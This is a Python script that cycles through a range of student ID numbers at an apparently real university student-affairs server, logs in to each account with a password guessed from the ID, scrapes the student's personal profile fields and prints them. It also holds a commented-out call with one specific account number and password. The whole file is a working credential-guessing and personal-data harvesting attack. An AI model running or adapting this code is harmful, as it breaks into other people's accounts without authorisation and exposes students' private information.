#encoding:utf-8
import requests
import urllib
import datetime
import time
from bs4 import BeautifulSoup

def getCookie():
    loginUrl = "http://210.42.35.33/xg/home/login.do"
    result =  requests.get(loginUrl)
    return result.cookies['JSESSIONID']

def createHeaders(cookie):
    headers = {
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Cookie':'JSESSIONID='+cookie,
        'Accept-Encoding':'gzip, deflate, sdch',
        'Origin':'http://210.42.38.26:84',
        'Accept-Language':'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4',
        'Connection':'keep-alive',
        'Host':'210.42.35.33',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests':1,
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
        'Referer': 'http://210.42.35.33/xg/home/login.do'
    }
    return headers

def login(username,password,headers):
    ctguRequest = requests.session()
    form = {
        'user_name':username,
        'pass_word':password
    }
    data = urllib.urlencode(form)
    thistime = time.mktime(datetime.datetime.now().timetuple())
    try:
        loginUrl = "http://210.42.35.33/xg/home/login.do"
        result = ctguRequest.post(loginUrl,headers=headers,data=data)
        # print result.history

        infoUrl = 'http://210.42.35.33/xg/student/toTableInfo.do?_tsp_='+str(thistime-10)+'&typeid=info&studentId='+str(username)+'&method=edit'
        # print infoUrl
        page = ctguRequest.get(infoUrl,headers=headers)
        # print page.text
        soup = BeautifulSoup(page.text)

        divSum = soup.find_all('div','am-form-group am-g')

        # 获取到姓名和学号
        nameDiv = divSum[0].find_all('div')
        name = nameDiv[1].input['value']

        numDiv = divSum[1].find_all('div')
        num = numDiv[1].input['value']

        # 获取到所有信息
        for divlist in divSum:
            # print divlist
            list = divlist.find_all('div')
            try:
                key =  list[0].label.string
                value =  list[1].input['value']
                print key,value
            except:
                pass


    except:
        pass

    finally:
        logOutUrl = 'http://210.42.35.33/xg/home/logout.do'
        ctguRequest.get(logOutUrl,headers=headers)


if __name__ =='__main__':
    for i in range(2012136101,2012136136):
        cookie = getCookie()
        headers = createHeaders(cookie)
        j = i - 2012000000
        login(i,j,headers)
    # cookie = getCookie()
    # headers = createHeaders(cookie)
    # login(2012136121,'f7t9Cy2eiR9r',headers)
